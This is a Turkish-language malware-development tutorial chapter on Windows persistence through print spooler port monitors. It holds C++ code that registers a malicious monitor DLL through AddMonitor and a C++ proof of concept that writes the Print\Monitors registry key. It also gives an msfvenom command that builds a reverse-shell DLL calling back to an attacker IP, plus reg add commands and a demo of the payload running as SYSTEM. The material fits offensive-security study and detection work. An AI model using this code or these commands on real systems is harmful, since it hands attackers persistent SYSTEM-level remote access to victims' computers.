\newpage
\subsection{74. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 8. Bağlantı noktası monitörleri. Basit C++ örneği.}

![pers](./images/59/2022-06-20_19-35.png){width="80%"}    

Bu gönderi, kötü amaçlı yazılım kalıcılık tekniklerinden biri olan bağlantı noktası monitörleri üzerine yapılan kişisel araştırmaların bir sonucudur.    

### bağlantı noktası monitörleri (port monitors)

Bu gönderide Bağlantı Noktası Monitörü, Windows Yazdırma Biriktirici Hizmeti veya `spoolv.exe`'yi ifade etmektedir. Bir yazıcı bağlantı noktası monitörü eklerken, bir kullanıcı (veya saldırgan), *monitör* olarak hizmet eden rastgele bir DLL ekleyebilir.   

Bağlantı noktası monitörü eklemenin, yani kötü amaçlı DLL’inizi yerleştirmenin temelde iki yolu vardır: Kalıcılık için Kayıt Defteri aracılığıyla veya anında DLL yürütme için özel bir Windows uygulaması (`AddMonitor` işlevi) kullanarak.   

### monitör ekleme

Win32 API’yi, özellikle Yazdırma Biriktirici API’sinin `AddMonitor` işlevini kullanarak:    

```cpp
BOOL AddMonitor(
  LPTSTR pName,
  DWORD  Level,
  LPBYTE pMonitors
);
```

Sistem çalışırken rastgele bir monitör DLL’si eklemek mümkündür. Monitörü eklemek için yerel yönetici ayrıcalıklarına ihtiyacınız olacağını unutmayın.   

Örneğin, monitörümüzün kaynak kodu:    

```cpp
/*
monitor.cpp
windows persistence via port monitors
register the monitor port
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/19/malware-pers-8.html
*/
#include "windows.h"
#pragma comment(lib, "winspool")

int main(int argc, char* argv[]) {
  MONITOR_INFO_2 mi;
  mi.pName = "Monitor";
  mi.pEnvironment = "Windows x64";
  // mi.pDLLName = "evil.dll";
  mi.pDLLName = "evil2.dll";
  AddMonitor(NULL, 2, (LPBYTE)&mi);
  return 0;
}

```

Şu kodu derleyelim:

```bash
x86_64-w64-mingw32-g++ -O2 monitor.cpp -o monitor.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -lwinspool
```

![pers](./images/59/2022-06-20_08-17.png){width="80%"}    

Ayrıca, “kötü” DLL’imizi oluşturun:    

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=192.168.56.1 LPORT=4445 -f dll > evil2.dll
```

![pers](./images/59/2022-06-20_19-24.png){width="80%"}    

Kodun derlenmesi, sistemde kötü niyetli DLL'yi (`evil2.dll`) kaydedecek bir yürütülebilir dosya (benim durumumda `monitor.exe`) üretecektir.    

### "monitör" ekleme demosu

Dosyaları kopyalayın ve çalıştırın:

```powershell
copy Z:\2022-06-19-malware-pers-8\evil2.dll .\
copy Z:\2022-06-19-malware-pers-8\monitor.exe .\
.\monitor.exe
```

![pers](./images/59/2022-06-20_19-28.png){width="80%"}    

### kayıt defteri kalıcılığı (registry persistence)

Alt anahtar bağlantı noktası monitörlerinin bir listesi, şu düğüm içinde bulunabilir:   
`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors`     

Her anahtar, bir `Drivers` DLL içeren bir `REG_SZ` girişi içermelidir. Sistem başlangıcında, bu DLL'lerin her biri `SYSTEM` olarak çalıştırılacaktır.    

Öncelikle, kötü amaçlı işlemlerden önce alt anahtarları kontrol edin:   

```powershell
reg query \
"HKLM\System\CurrentControlSet\Control\Print\Monitors" \
/s
```

![pers](./images/59/2022-06-20_15-48.png){width="80%"}    

Ardından, `Meow` adlı bir alt anahtar ve `Driver` değeri ekleyin:   

```powershell
reg add \
"HKLM\System\CurrentControlSet\Control\Print\Monitors\Meow"
 /v "Driver" /d "evil2.dll" /t REG_SZ
reg query \
"HKLM\System\CurrentControlSet\Control\Print\Monitors"
 /s
```

![pers](./images/59/2022-06-20_18-17.png){width="80%"}    

Gördüğünüz gibi, her şey doğru şekilde tamamlandı. Ardından, kurbanın bilgisayarını yeniden başlatın:     

![pers](./images/59/2022-06-20_18-17_1.png){width="80%"}    

![pers](./images/59/2022-06-20_18-17_2.png){width="80%"}    

Ve birkaç dakikadan sonra:   

![pers](./images/59/2022-06-20_19-30.png){width="80%"}    

![pers](./images/59/2022-06-20_19-31.png){width="80%"}    

Hadi Process Hacker 2'de `Ağ (Network)` sekmesini kontrol edelim:    

![pers](./images/59/2022-06-20_19-34.png){width="80%"}    

Görüyoruz ki `evil2.dll`, `spoolsv.exe` (`PID: 4616`) tarafından erişiliyor ve sonunda bizim payload’umuzu çalıştıran `rundll32` sürecini başlatıyor, bu da saldırgana geri bağlantı başlatıyor:    

![pers](./images/59/2022-06-20_19-33.png){width="80%"}    

Deneylerin sonunda temizleme işlemi için aşağıdaki komutu çalıştırın:   

```powershell
Remove-ItemProperty -Path \
"HKLM:\System\CurrentControlSet\Control\Print\Monitors\
Meow" -Name "Driver"
```

![pers](./images/59/2022-06-20_21-22.png){width="80%"}    

Kayıt defteri kalıcılığı için "kirli PoC"im:   

```cpp
/*
pers.cpp
windows persistence via port monitors
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/19/malware-pers-8.html
*/
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // subkey
  const char* sk = 
  "\\System\\CurrentControlSet\\Control\\Print\\Monitors\\Meow";

  // evil DLL
  const char* evilDll = "evil.dll";

  // startup
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
  (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, 
  KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {

    // create new registry key
    RegSetValueEx(hkey, (LPCSTR)"Driver", 0, REG_SZ, 
    (unsigned char*)evilDll, strlen(evilDll));
    RegCloseKey(hkey);
  } else {
    printf("failed to create new registry subkey :(");
    return -1;
  }
    return 0;
}
```

Defcon 22 sırasında, Brady Bloxham bu kalıcılık tekniğini [gösterdi](https://defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf). Bu yöntem, Yönetici ayrıcalıkları gerektirir ve DLL’in diske kaydedilmesi gerekir.   
Hâlâ cevaplanması gereken soru, herhangi bir APT'nin bu tekniği gerçek saldırılarda kullanıp kullanmadığıdır.   

[Windows Print Spooler Service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc)    
[Defcon-22: Brady Bloxham - Getting Windows to Play with itself](https://defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf)    
[MITRE ATT&CK - Port Monitors persistence technique](https://attack.mitre.org/techniques/T1547/010/)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2022-06-19-malware-pers-8)   
